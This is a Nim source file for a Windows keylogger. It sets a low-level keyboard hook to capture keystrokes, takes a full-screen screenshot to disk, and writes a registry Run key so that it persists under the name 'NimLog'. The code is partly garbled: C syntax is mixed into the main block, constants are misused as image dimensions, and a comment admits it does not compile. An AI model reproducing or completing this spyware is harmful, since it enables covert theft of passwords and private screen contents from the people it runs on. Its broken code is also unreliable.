import winim
import std/bitops
import std/strutils
import pixie
import streams

var
  hook*: HHOOK # hook handle
  kbdStruct*: KBDLLHOOKSTRUCT # contains keycode etc
  msg: MSG
  buf: seq[char]

proc Screenshot() =
  echo "[*] Taking screenshot"

  let x = GetSystemMetrics(SM_XVIRTUALSCREEN);
  let y  = GetSystemMetrics(SM_YVIRTUALSCREEN);
  let cx = GetSystemMetrics(SM_CXVIRTUALSCREEN);
  let cy = GetSystemMetrics(SM_CYVIRTUALSCREEN);
  let dcScreen = GetDC(0);
  let dcTarget = CreateCompatibleDC(dcScreen);
  let bmpTarget = CreateCompatibleBitmap(dcScreen, cx, cy);
  let oldBmp = SelectObject(dcTarget, bmpTarget);
  BitBlt(dcTarget, 0, 0, cx, cy, dcScreen, x, y, bitor(SRCCOPY, CAPTUREBLT));
  SelectObject(dcTarget, oldBmp);

  var image = newImage(SM_CXVIRTUALSCREEN, SM_CYVIRTUALSCREEN)

  var mybmi: BITMAPINFO
  mybmi.bmiHeader.biSize = int32 sizeof(mybmi)
  mybmi.bmiHeader.biWidth = int32 SM_CXVIRTUALSCREEN
  mybmi.bmiHeader.biHeight = int32 SM_CYVIRTUALSCREEN
  mybmi.bmiHeader.biPlanes = 1
  mybmi.bmiHeader.biBitCount = 32
  mybmi.bmiHeader.biCompression = BI_RGB
  mybmi.bmiHeader.biSizeImage = DWORD(SM_CXVIRTUALSCREEN * SM_CYVIRTUALSCREEN * 4.int32)

  discard CreateDIBSection(dcTarget, addr mybmi, cast[UINT](DIB_RGB_COLORS), cast[ptr pointer](unsafeAddr(image.data[0])), 0, 0)
  discard GetDIBits(dcTarget, bmpTarget, 0, cast[UINT](SM_CYVIRTUALSCREEN), cast[ptr pointer](unsafeAddr(image.data[0])), addr mybmi, DIB_RGB_COLORS)

  var file = openFileStream("im.bmp", fmWrite)

  file.writeLine("P6 ", SM_CXVIRTUALSCREEN, " ", SM_CYVIRTUALSCREEN, " 255")

  for x in 0..SM_CYVIRTUALSCREEN:
    for y in 0..SM_CYVIRTUALSCREEN:
      file.write(chr(image[x, y].r))
      file.write(chr(image[x, y].g))
      file.write(chr(image[x, y].b))

  DeleteDC(dcTarget);

  file.close()

  # todo: fix compilation error


proc HookCallback*(nCode: cint; wParam: WPARAM; lParam: LPARAM): LRESULT {.stdcall.} =
  if nCode >= 0 and wParam == WM_KEYDOWN:
      kbdStruct = (cast[ptr KBDLLHOOKSTRUCT](lParam))[]
      var pressed: ptr int = cast[ptr int](addr(kbdStruct))
      var shiftPressed: bool = (GetAsyncKeyState(VK_SHIFT) != 0)
      if pressed[] != VK_SHIFT:
        var keyPressed = if shiftPressed: cast[ptr char](pressed)[] else: cast[ptr char](pressed)[].toLowerAscii()
        buf.add(keyPressed)
        # echo buf
  return CallNextHookEx(hook, nCode, wParam, lParam)

when isMainModule:
  echo "[*] Adding to autostart via registry"
  HKEY hkey = NULL;
  RegCreateKey(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", &hkey);
  RegSetValueEx(hkey, L"NimLog", 0, REG_SZ , (BYTE*)path, (wcslen(path)+1)*2);
  echo "[*] Setting hook"
  hook = SetWindowsHookEx(WH_KEYBOARD_LL, cast[HOOKPROC](HookCallback), 0, 0)
  if bool(hook):
    Screenshot()
    while GetMessage(addr(msg), 0, 0, 0):
      discard # get message events like key inputs
  else:
    echo "[!] Failed to set hook"
